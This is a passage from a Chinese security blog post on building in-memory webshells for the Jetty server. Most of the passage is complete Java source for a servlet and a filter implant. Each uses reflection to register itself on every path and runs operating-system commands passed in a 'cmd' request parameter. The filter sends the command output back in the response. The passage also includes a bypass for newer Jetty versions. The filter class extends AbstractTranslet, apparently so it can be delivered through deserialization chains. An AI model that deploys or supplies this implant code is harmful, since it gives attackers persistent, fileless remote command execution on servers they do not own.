<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取ServletHolder</span></span><br><span class="line"><span class="type">Servlet</span> <span class="variable">servlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BehinderServlet</span>();</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor2</span> <span class="operator">=</span> servletHandler.getClass().getClassLoader().loadClass(<span class="string">&quot;org.eclipse.jetty.servlet.ServletHolder&quot;</span>).getDeclaredConstructor();</span><br><span class="line">constructor2.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">servletHolder</span> <span class="operator">=</span> constructor2.newInstance();</span><br><span class="line"></span><br><span class="line"><span class="type">Method</span> <span class="variable">setFilter</span> <span class="operator">=</span> servletHolder.getClass().getDeclaredMethod(<span class="string">&quot;setServlet&quot;</span>, Servlet.class);</span><br><span class="line">setFilter.invoke(servletHolder, servlet);</span><br><span class="line"></span><br><span class="line"><span class="type">Method</span> <span class="variable">setName</span> <span class="operator">=</span> servletHolder.getClass().getSuperclass().getDeclaredMethod(<span class="string">&quot;setName&quot;</span>, String.class);</span><br><span class="line">setName.invoke(servletHolder, ServletName);</span><br><span class="line"></span><br><span class="line"><span class="comment">//装载_servlet</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">addServlet</span> <span class="operator">=</span> servletHandler.getClass().getDeclaredMethod(<span class="string">&quot;addServlet&quot;</span>, servletHolder.getClass());</span><br><span class="line">addServlet.setAccessible(<span class="literal">true</span>);</span><br><span class="line">addServlet.invoke(servletHandler, servletHolder);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>对于<code>_servletsMapping</code>来讲，其内容物是一个ServletMapping的对象，主要就是存放Servlet的作用路径以及Servlet的名称。</p>
<img data-src="/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/32.jpg" class>
<p>最后通过同样的思路也能够找到ServletHandler对<code>_servletsMapping</code>变量进行赋值的过程。如下所示</p>
<img data-src="/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/33.jpg" class>
<p>最终给出如下的servlet内存马代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fanxing.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> MemshellTest.BehinderFilter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.Filter;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.Servlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BehinderServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">Object</span> <span class="variable">servletHandler</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">ServletName</span> <span class="operator">=</span> <span class="string">&quot;BehinderServlet&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;/*&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Object obj, String name)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> obj.getClass();</span><br><span class="line">        <span class="keyword">while</span>(clazz != Object.class) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                field = clazz.getDeclaredField(name);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException var6) &#123;</span><br><span class="line">                clazz = clazz.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">getHandler</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">thread</span> <span class="operator">=</span> Thread.currentThread();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">contextClassLoader</span> <span class="operator">=</span> getFieldValue(thread, <span class="string">&quot;contextClassLoader&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">context</span> <span class="operator">=</span> getFieldValue(contextClassLoader,<span class="string">&quot;_context&quot;</span>);</span><br><span class="line">        servletHandler = getFieldValue(context, <span class="string">&quot;_servletHandler&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//获取ServletHandler</span></span><br><span class="line">            getHandler();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//获取ServletHolder</span></span><br><span class="line">            <span class="type">Servlet</span> <span class="variable">servlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BehinderServlet</span>();</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">constructor2</span> <span class="operator">=</span> servletHandler.getClass().getClassLoader().loadClass(<span class="string">&quot;org.eclipse.jetty.servlet.ServletHolder&quot;</span>).getDeclaredConstructor();</span><br><span class="line">            constructor2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">servletHolder</span> <span class="operator">=</span> constructor2.newInstance();</span><br><span class="line"></span><br><span class="line">            <span class="type">Method</span> <span class="variable">setFilter</span> <span class="operator">=</span> servletHolder.getClass().getDeclaredMethod(<span class="string">&quot;setServlet&quot;</span>, Servlet.class);</span><br><span class="line">            setFilter.invoke(servletHolder, servlet);</span><br><span class="line"></span><br><span class="line">            <span class="type">Method</span> <span class="variable">setName</span> <span class="operator">=</span> servletHolder.getClass().getSuperclass().getDeclaredMethod(<span class="string">&quot;setName&quot;</span>, String.class);</span><br><span class="line">            setName.invoke(servletHolder, ServletName);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//装载_servlet</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">addServlet</span> <span class="operator">=</span> servletHandler.getClass().getDeclaredMethod(<span class="string">&quot;addServlet&quot;</span>, servletHolder.getClass());</span><br><span class="line">            addServlet.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            addServlet.invoke(servletHandler, servletHolder);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//初始化mapping</span></span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> servletHandler.getClass().getClassLoader().loadClass(<span class="string">&quot;org.eclipse.jetty.servlet.ServletMapping&quot;</span>).getDeclaredConstructor();</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">servletMapping</span> <span class="operator">=</span> constructor.newInstance();</span><br><span class="line"></span><br><span class="line">            <span class="type">Method</span> <span class="variable">setFilterName</span> <span class="operator">=</span> servletMapping.getClass().getDeclaredMethod(<span class="string">&quot;setServletName&quot;</span>, String.class);</span><br><span class="line">            setFilterName.invoke(servletMapping, ServletName);</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">pathSpecs</span> <span class="operator">=</span> url;</span><br><span class="line"></span><br><span class="line">            <span class="type">Method</span> <span class="variable">setPathSpec</span> <span class="operator">=</span> servletMapping.getClass().getDeclaredMethod(<span class="string">&quot;setPathSpec&quot;</span>, String.class);</span><br><span class="line">            setPathSpec.invoke(servletMapping, pathSpecs);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//加入_servletMappings</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">addServletMapping</span> <span class="operator">=</span> servletHandler.getClass().getDeclaredMethod(<span class="string">&quot;addServletMapping&quot;</span>, servletMapping.getClass());</span><br><span class="line">            addServletMapping.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            addServletMapping.invoke(servletHandler,servletMapping);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse resp)</span></span><br><span class="line">            <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;FanXing&quot;</span>);</span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果如下所示</p>
<img data-src="/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/34.jpg" class>
<h4 id="高版本利用绕过">高版本利用绕过</h4>
<p>之前在Filter内存马实现的过程中前半段使用的是9.4.44.v20210927版本jetty，在那个版本有一个setFilter没有办法正常set变量<code>_filter</code>的问题，所以在后半段以及Servlet内存马实现的时候都使用的是9.0.7.v20131107版本</p>
<p>这一节主要是为了解决高版本下的内容绕过，再次回到FilterHolder代码段跟踪运行逻辑</p>
<p>FilterHolder#setFilter</p>
<img data-src="/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/35.png" class>
<p>然后到Holder#setInstance</p>
<img data-src="/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/36.png" class>
<p>最后到BaseHolder#setInstance，可以发现传进去的filter实例化对象最终赋给了<code>_instance</code></p>
<img data-src="/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/37.png" class>
<p>最后回看FilterHolder当中的代码检索哪一部分，调用了getInstance，最后发现在initialize()函数当中使用getInstance为<code>_filter</code>进行赋值。</p>
<img data-src="/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/38.png" class>
<p>进一步的去看super.initialize()当中的内容，可以发现它做了一次有关生命周期的判断内容，在默认情况下我们走到这里的<code>_state</code>是0，所以在这里我们会直接进入if语句里面并抛出异常（AbstractLifeCycle#isStarted）</p>
<img data-src="/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/39.png" class>
<img data-src="/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/40.png" class>
<p>但是在AbstractLifeCycle当中存在着可以改变<code>_state</code>的setter方法，比如可以强制把他改变成2的getStarted()方法</p>
<img data-src="/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/41.png" class>
<p>所以我们可以在获取FilterHolder当中的代码下面加入如下语句，这样内存马就可以按照预期的逻辑向<code>_filter</code>当中写入数据了</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">setStarted</span> <span class="operator">=</span> getMethod(filterHolder,<span class="string">&quot;setStarted&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">setStarted.invoke(filterHolder);</span><br><span class="line"><span class="type">Method</span> <span class="variable">initialize</span> <span class="operator">=</span> filterHolder.getClass().getDeclaredMethod(<span class="string">&quot;initialize&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">initialize.setAccessible(<span class="literal">true</span>);</span><br><span class="line">initialize.invoke(filterHolder);</span><br></pre></td></tr></table></figure>
<p>但是这样仍不够，我们通过了上面代码当中的判断，直接来到了</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">this</span>._filter = (Filter)<span class="built_in">this</span>.wrap(<span class="built_in">this</span>._filter, WrapFunction.class, WrapFunction::wrapFilter);</span><br></pre></td></tr></table></figure>
<img data-src="/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/42.png" class>
<p>在使用wrap进行封装的时候会出现问题，在该代码逻辑里面会采用getServletHandler()来获取ServletHandler对象，但是这里的this是FilterHolder其中的<code>_servletHandler</code>是null，所以会造成空指针异常。</p>
<img data-src="/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/43.png" class>
<p>为了过这一步验证，我们可以在getHandler里面拿到的servletHanlder通过setter方法放进去</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">setServletHandler</span> <span class="operator">=</span> getMethod(filterHolder,<span class="string">&quot;setServletHandler&quot;</span>, servletHandler.getClass());</span><br><span class="line">setServletHandler.invoke(filterHolder, servletHandler);</span><br></pre></td></tr></table></figure>
<p>最终我们的实现结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><span class="line">package MemshellTest;</span><br><span class="line"></span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line">import org.eclipse.jetty.servlet.FilterHolder;</span><br><span class="line">import org.eclipse.jetty.servlet.FilterMapping;</span><br><span class="line"></span><br><span class="line">import javax.servlet.*;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.util.ArrayList;</span><br><span class="line"></span><br><span class="line">public class BehinderFilter extends AbstractTranslet implements Filter &#123;</span><br><span class="line"></span><br><span class="line">    public static Object servletHandler = null;</span><br><span class="line"></span><br><span class="line">    private static String filterName = &quot;BehinderFilter&quot;;</span><br><span class="line">    private static String url = &quot;/*&quot;;</span><br><span class="line">    public static Object getFieldValue(Object obj, String name) throws Exception&#123;</span><br><span class="line">        Field field = null;</span><br><span class="line">        Class clazz = obj.getClass();</span><br><span class="line">        while(clazz != Object.class) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                field = clazz.getDeclaredField(name);</span><br><span class="line">                break;</span><br><span class="line">            &#125; catch (NoSuchFieldException var6) &#123;</span><br><span class="line">                clazz = clazz.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        return field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Method getMethod(Object obj, String name, Class&lt;?&gt;... paramClazz) throws NoSuchMethodException &#123;</span><br><span class="line">        Method method = null;</span><br><span class="line">        Class clazz = obj.getClass();</span><br><span class="line">        while(clazz != Object.class) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                method = clazz.getDeclaredMethod(name, paramClazz);</span><br><span class="line">                break;</span><br><span class="line">            &#125; catch (NoSuchMethodException var6) &#123;</span><br><span class="line">                clazz = clazz.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        method.setAccessible(true);</span><br><span class="line">        return method;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void getHandler() throws Exception&#123;</span><br><span class="line">        Object thread = Thread.currentThread();</span><br><span class="line">        Object contextClassLoader = getFieldValue(thread, &quot;contextClassLoader&quot;);</span><br><span class="line">        Object context = getFieldValue(contextClassLoader,&quot;_context&quot;);</span><br><span class="line">        servletHandler = getFieldValue(context, &quot;_servletHandler&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            //获取ServletHandler</span><br><span class="line">            getHandler();</span><br><span class="line"></span><br><span class="line">            //获取FilterHolder</span><br><span class="line">            Filter filter = new BehinderFilter();</span><br><span class="line">            Constructor constructor2 = servletHandler.getClass().getClassLoader().loadClass(&quot;org.eclipse.jetty.servlet.FilterHolder&quot;).getDeclaredConstructor();</span><br><span class="line">            constructor2.setAccessible(true);</span><br><span class="line">            Object filterHolder = constructor2.newInstance();</span><br><span class="line"></span><br><span class="line">            Method setFilter = filterHolder.getClass().getDeclaredMethod(&quot;setFilter&quot;,Filter.class);</span><br><span class="line">            setFilter.invoke(filterHolder,filter);</span><br><span class="line"></span><br><span class="line">            Method setName = filterHolder.getClass().getSuperclass().getDeclaredMethod(&quot;setName&quot;,String.class);</span><br><span class="line">            setName.invoke(filterHolder,filterName);</span><br><span class="line">            //高版本绕过代码段</span><br><span class="line"></span><br><span class="line">            Method setStarted = getMethod(filterHolder,&quot;setStarted&quot;, null);</span><br><span class="line">            setStarted.invoke(filterHolder);</span><br><span class="line"></span><br><span class="line">            Method setServletHandler = getMethod(filterHolder,&quot;setServletHandler&quot;, servletHandler.getClass());</span><br><span class="line">            setServletHandler.invoke(filterHolder, servletHandler);</span><br><span class="line"></span><br><span class="line">            Method initialize = filterHolder.getClass().getDeclaredMethod(&quot;initialize&quot;, null);</span><br><span class="line">            initialize.setAccessible(true);</span><br><span class="line">            initialize.invoke(filterHolder);</span><br><span class="line"></span><br><span class="line">            //拼凑filtermapping</span><br><span class="line"></span><br><span class="line">            Constructor constructor = servletHandler.getClass().getClassLoader().loadClass(&quot;org.eclipse.jetty.servlet.FilterMapping&quot;).getDeclaredConstructor();</span><br><span class="line">            constructor.setAccessible(true);</span><br><span class="line">            Object filterMapping = constructor.newInstance();</span><br><span class="line"></span><br><span class="line">            Method setFilterName = filterMapping.getClass().getDeclaredMethod(&quot;setFilterName&quot;,String.class);</span><br><span class="line">            setFilterName.invoke(filterMapping,filterName);</span><br><span class="line"></span><br><span class="line">            Method setFilterHolder = filterMapping.getClass().getDeclaredMethod(&quot;setFilterHolder&quot;,filterHolder.getClass());</span><br><span class="line">            setFilterHolder.setAccessible(true);</span><br><span class="line">            setFilterHolder.invoke(filterMapping,filterHolder);</span><br><span class="line"></span><br><span class="line">            String pathSpecs = url;</span><br><span class="line"></span><br><span class="line">            Method setPathSpec = filterMapping.getClass().getDeclaredMethod(&quot;setPathSpec&quot;,String.class);</span><br><span class="line">            setPathSpec.invoke(filterMapping,pathSpecs);</span><br><span class="line"></span><br><span class="line">            //加入filterPathMappings</span><br><span class="line">            ArrayList _filterPathMapings = (ArrayList) getFieldValue(servletHandler,&quot;_filterPathMappings&quot;);</span><br><span class="line">            _filterPathMapings.add(filterMapping);</span><br><span class="line"></span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            throw new RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void init(FilterConfig filterConfig) throws ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException &#123;</span><br><span class="line">        String cmd = request.getParameter(&quot;cmd&quot;);</span><br><span class="line">        //为了避免初次的命令执行空指针异常</span><br><span class="line">        if(cmd != null)&#123;</span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line">            //回显处理</span><br><span class="line">            Process process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">            InputStream inputStream = process.getInputStream();</span><br><span class="line">            java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(inputStream));</span><br><span class="line">            String line;</span><br><span class="line">            StringBuilder stringBuilder = new StringBuilder();</span><br><span class="line">            while ((line = reader.readLine()) != null)&#123;</span><br><span class="line">                stringBuilder.append(line + &quot;\n&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            ServletOutputStream servletOutputStream = response.getOutputStream();</span><br><span class="line">            servletOutputStream.write(stringBuilder.toString().getBytes());</span><br><span class="line">            servletOutputStream.flush();</span><br><span class="line">            servletOutputStream.close();</span><br><span class="line">        &#125;</span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void destroy() &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同时可以完美运行</p>
<img data-src="/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/44.png" class>
<h4 id="参考文章">参考文章</h4>
<p>https://xi3w3n.life/2024/05/12/3e15b7c0</p>
<p>https://www.cnblogs.com/Gejkdj/p/17104665.html</p>
<p>https://3gstudent.github.io/Java%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7-Jetty-Filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC</p>
<p>https://www.4hou.com/posts/YXG2</p>
<p>https://blog.csdn.net/m0_56085369/article/details/117480169</p>
<p>https://blog.csdn.net/weixin_38663081/article/details/105615699</p>
<p>https://3gstudent.github.io/Java%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7-Jetty-Servlet%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC</p>
<p>https://xz.aliyun.com/t/12182</p>

    </div>

    
    
    

    <footer class="post-footer">
          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>本文作者： </strong>f4nx1ng
  </li>
  <li class="post-copyright-link">
      <strong>本文链接：</strong>
      <a href="https://f4nx1ng.github.io/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/" title="Jetty内存马">https://f4nx1ng.github.io/2024/08/02/Jetty内存马/</a>
  </li>
  <li class="post-copyright-license">
